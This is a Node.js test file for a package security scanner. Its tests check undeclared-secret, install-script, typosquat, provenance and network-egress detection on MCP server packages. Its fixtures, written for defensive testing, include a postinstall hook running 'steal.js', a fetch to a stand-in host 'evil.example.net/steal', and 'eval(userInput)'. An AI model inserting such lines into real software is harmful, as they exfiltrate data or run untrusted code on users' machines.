import test from 'node:test';
import assert from 'node:assert/strict';
import { gzipSync } from 'node:zlib';
import { readTarGz } from '../src/tar.js';
import {
  checkUndeclaredSecrets,
  checkInstallScripts,
  checkProvenance,
  checkTyposquat,
  checkNetworkEgress,
  checkCapabilities,
  editDistance,
  isCredentialName,
  checkDeprecated,
} from '../src/checks.js';

/** Build a single-file tar (ustar) in memory, so the reader is tested on real bytes. */
function tarWith(path, content) {
  const data = Buffer.from(content, 'utf8');
  const header = Buffer.alloc(512);
  header.write(path, 0, 100, 'utf8');
  header.write('0000644\0', 100, 8, 'ascii'); // mode
  header.write('0000000\0', 108, 8, 'ascii'); // uid
  header.write('0000000\0', 116, 8, 'ascii'); // gid
  header.write(`${data.length.toString(8).padStart(11, '0')}\0`, 124, 12, 'ascii');
  header.write('00000000000\0', 136, 12, 'ascii'); // mtime
  header.write('        ', 148, 8, 'ascii'); // checksum placeholder
  header.write('0', 156, 1, 'ascii'); // typeflag: regular file
  header.write('ustar\0', 257, 6, 'ascii');
  header.write('00', 263, 2, 'ascii');
  let sum = 0;
  for (const b of header) sum += b;
  header.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 8, 'ascii');

  const padded = Buffer.alloc(Math.ceil(data.length / 512) * 512);
  data.copy(padded);
  return Buffer.concat([header, padded, Buffer.alloc(1024)]);
}

function pkgWith(files, manifest = {}) {
  return {
    name: manifest.name ?? 'test-pkg',
    version: '1.0.0',
    manifest,
    files: new Map(Object.entries(files).map(([k, v]) => [k, Buffer.from(v, 'utf8')])),
    integrityOk: true,
    versionCount: 5,
    publishedAt: '2020-01-01T00:00:00.000Z',
  };
}

test('tar reader round-trips a file and strips the package/ prefix', () => {
  const files = readTarGz(gzipSync(tarWith('package/index.js', 'export const x = 1;\n')));
  assert.equal(files.size, 1);
  assert.equal(files.get('index.js').toString(), 'export const x = 1;\n');
});

test('tar reader skips files over the size cap', () => {
  const files = readTarGz(gzipSync(tarWith('package/big.js', 'x'.repeat(5000))), { maxFileBytes: 100 });
  assert.equal(files.size, 0);
});

test('flags a credential the registry entry never declared', () => {
  const pkg = pkgWith({ 'index.js': 'const k = process.env.ACME_API_KEY;\n' });
  const findings = checkUndeclaredSecrets(pkg, { server: { name: 'x' } }, new Map());
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, 'high');
  assert.match(findings[0].message, /ACME_API_KEY/);
  assert.equal(findings[0].evidence[0].line, 1);
});

test('stays quiet when the entry declares the variable', () => {
  const pkg = pkgWith({ 'index.js': 'const k = process.env.ACME_API_KEY;\n' });
  const declared = new Map([['ACME_API_KEY', { isSecret: true, isRequired: true }]]);
  assert.deepEqual(checkUndeclaredSecrets(pkg, { server: { name: 'x' } }, declared), []);
});

test('ignores ambient environment variables', () => {
  const pkg = pkgWith({ 'index.js': 'if (process.env.NODE_ENV === "production") {}\n' });
  assert.deepEqual(checkUndeclaredSecrets(pkg, null, new Map()), []);
});

test('reads python environment access too', () => {
  const pkg = pkgWith({ 'main.py': 'token = os.environ.get("GITHUB_TOKEN")\n' });
  const findings = checkUndeclaredSecrets(pkg, { server: { name: 'x' } }, new Map());
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, 'high');
});

test('install scripts: postinstall is high; prepare never runs for a consumer, so it is not flagged', () => {
  const findings = checkInstallScripts(
    pkgWith({}, { scripts: { postinstall: 'node steal.js', prepare: 'npm run build' } })
  );
  assert.deepEqual(findings.map((f) => [f.message.split(' ')[2], f.severity]), [['postinstall', 'high']]);
});

test('credential names: secrets yes, things that point at secrets no, webhook URLs yes', () => {
  assert.equal(isCredentialName('CONTEXT7_API_KEY'), true);
  assert.equal(isCredentialName('X402_PRIVATE_KEY'), true);
  assert.equal(isCredentialName('OAUTH_AUTH_SERVER_URL'), false);
  assert.equal(isCredentialName('INITE_TOKEN_FILE'), false);
  assert.equal(isCredentialName('PRISMA_PLATFORM_AUTH_FILE'), false);
  assert.equal(isCredentialName('SLACK_WEBHOOK_URL'), true);
  assert.equal(isCredentialName('NODE_ENV'), false);
  assert.equal(isCredentialName('FIRECRAWL_MCP_SEARCH_OAUTH_ONLY'), false);
  assert.equal(isCredentialName('MCP_OAUTH_ACCEPT_LEGACY_V2_MCP_AUD'), false);
  // Segment endings, not substrings (false positives from the 2026-09-28 PyPI benchmark).
  assert.equal(isCredentialName('KEYCLOAK_REALM'), false);
  assert.equal(isCredentialName('KEYCLOAK_DEFAULT_DATE_FROM_HOURS'), false);
  assert.equal(isCredentialName('KEYCLOAK_CLIENT_SECRET'), true);
  assert.equal(isCredentialName('CLIO_LEXICAL_MAX_TOKENS_PER_CHUNK'), false);
  assert.equal(isCredentialName('JDOCMUNCH_SESSION_TOKEN_BUDGET'), false);
  assert.equal(isCredentialName('GIT_AUTHOR_NAME'), false);
  assert.equal(isCredentialName('Authorization'), true); // header names go through the same rule
  // Singular time units were missing (2026-09-29 false positive, found while re-checking
  // the published sample before drafting publisher notices): FLAG_SUFFIX had only the
  // plural "MINUTES", so a real server's rate-limit setting read as a high-severity leak.
  assert.equal(isCredentialName('MCP_AUTH_FAILURES_PER_MINUTE'), false);
  assert.equal(isCredentialName('AUTH_RETRY_DELAY'), false);
  assert.equal(isCredentialName('SESSION_TIMEOUT_SECOND'), false);
  assert.equal(isCredentialName('CACHE_TTL_HOUR'), false);
  assert.equal(isCredentialName('LOCKOUT_DURATION_DAY'), false);
  // A second real one, same class: a token's cache LIFETIME is not the token
  // (found live in the published sample re-check, @digital-science-dsl/dimensions-analytics-mcp).
  assert.equal(isCredentialName('DIMENSIONS_TOKEN_CACHE_DURATION'), false);
  assert.equal(isCredentialName('SESSION_TOKEN'), true); // still a credential without the suffix
  assert.equal(isCredentialName('OPENAIKEY'), true);
  assert.equal(isCredentialName('SERVICE_API_KEYS'), true);
  assert.equal(isCredentialName('GITHUB_PERSONAL_ACCESS_TOKEN'), true);
  assert.equal(isCredentialName('SYNPAREIA_PRIVATE_KEY_B64'), true);
  assert.equal(isCredentialName('MCP_DELEGATED_CREDENTIAL_SECRET'), true);
  assert.equal(isCredentialName('KEYLESS_PROXY_SECRET'), true);
});

test('provenance: missing repository and a broken integrity hash', () => {
  const pkg = pkgWith({}, {});
  pkg.integrityOk = false;
  const findings = checkProvenance(pkg);
  assert.ok(findings.some((f) => f.severity === 'medium' && /repository/.test(f.message)));
  assert.ok(findings.some((f) => f.severity === 'high' && /integrity/.test(f.message)));
});

test('typosquat: unscoped clone of an official name is high', () => {
  const findings = checkTyposquat(pkgWith({}, { name: 'server-filesystem' }), [
    '@modelcontextprotocol/server-filesystem',
  ]);
  assert.equal(findings[0].severity, 'high');
});

test('typosquat: one character off is medium, the official package itself is clean', () => {
  const near = checkTyposquat(pkgWith({}, { name: 'server-filesystm' }), [
    '@modelcontextprotocol/server-filesystem',
  ]);
  assert.equal(near[0].severity, 'medium');
  const official = checkTyposquat(
    pkgWith({}, { name: '@modelcontextprotocol/server-filesystem' }),
    ['@modelcontextprotocol/server-filesystem']
  );
  assert.deepEqual(official, []);
});

test('egress ignores benign and declared hosts, reports the rest', () => {
  const pkg = pkgWith({
    'index.js': 'fetch("https://github.com/x"); fetch("https://api.declared.io/v1"); fetch("https://evil.example.net/steal");',
  });
  const entry = { server: { remotes: [{ url: 'https://api.declared.io/mcp' }] } };
  const hosts = checkNetworkEgress(pkg, entry).map((f) => f.message);
  assert.deepEqual(hosts, ['contacts evil.example.net']);
});

test('capabilities surface execution and evaluation', () => {
  const pkg = pkgWith({ 'index.js': 'import { execSync } from "child_process";\neval(userInput);\n' });
  const labels = checkCapabilities(pkg).map((f) => f.message);
  assert.ok(labels.some((l) => /process execution/.test(l)));
  assert.ok(labels.some((l) => /dynamic code evaluation/.test(l)));
});

test('edit distance', () => {
  assert.equal(editDistance('abc', 'abc'), 0);
  assert.equal(editDistance('abc', 'abd'), 1);
  assert.equal(editDistance('', 'abc'), 3);
});

test('findings carry the variable name as data, not only in the message', () => {
  const pkg = pkgWith({ 'index.js': 'const k = process.env.ACME_API_KEY;\n' });
  const [finding] = checkUndeclaredSecrets(pkg, { server: { name: 'x' } }, new Map());
  assert.equal(finding.subject, 'ACME_API_KEY');
});

test('a computed env var name is reported as unresolvable, not as a credential', () => {
  const pkg = pkgWith({ 'index.js': 'const k = process.env[`${prefix}_API_KEY`];\n' });
  const findings = checkUndeclaredSecrets(pkg, { server: { name: 'x' } }, new Map());
  assert.equal(findings.length, 1);
  assert.equal(findings[0].check, 'dynamic-env');
  assert.equal(findings[0].severity, 'info');
});

test('a deprecated version is flagged with the npm message; a live one is not', () => {
  const dead = { ...pkgWith({}, { deprecated: 'Package no longer supported.' }), name: 'x' };
  assert.equal(checkDeprecated(dead)[0].severity, 'medium');
  assert.match(checkDeprecated(dead)[0].message, /no longer supported/);
  assert.deepEqual(checkDeprecated(pkgWith({}, {})), []);
});

test('archived reference servers are flagged when their registry does not say so', async () => {
  const { checkArchivedUpstream } = await import('../src/checks.js');
  assert.equal(checkArchivedUpstream({ ecosystem: 'pypi', name: 'MCP_Server_SQLite', manifest: {} })[0].check, 'archived-upstream');
  assert.deepEqual(checkArchivedUpstream({ ecosystem: 'npm', name: '@modelcontextprotocol/server-github', manifest: { deprecated: 'Package no longer supported' } }), [], 'already deprecated: no double report');
  assert.deepEqual(checkArchivedUpstream({ ecosystem: 'pypi', name: 'mcp-server-git', manifest: {} }), [], 'mcp-server-git is maintained');
});

test('an attested source repository counts as traceable; Python runtime variables are ambient', () => {
  const pkg = { ecosystem: 'pypi', name: 'x', manifest: {}, files: new Map(), provenance: { current: true, publisher: { repository: 'o/r' } } };
  assert.ok(!checkProvenance(pkg).some((f) => /repository/.test(f.message)));
  assert.ok(checkProvenance({ ...pkg, provenance: { current: false } }).some((f) => /repository/.test(f.message)));
  const py = pkgWith({ 'server.py': 'import os\nenc = os.environ.get("PYTHONIOENCODING")\nv = os.environ.get("VIRTUAL_ENV")\n' });
  assert.deepEqual(checkUndeclaredSecrets(py, null, new Map()), []);
});
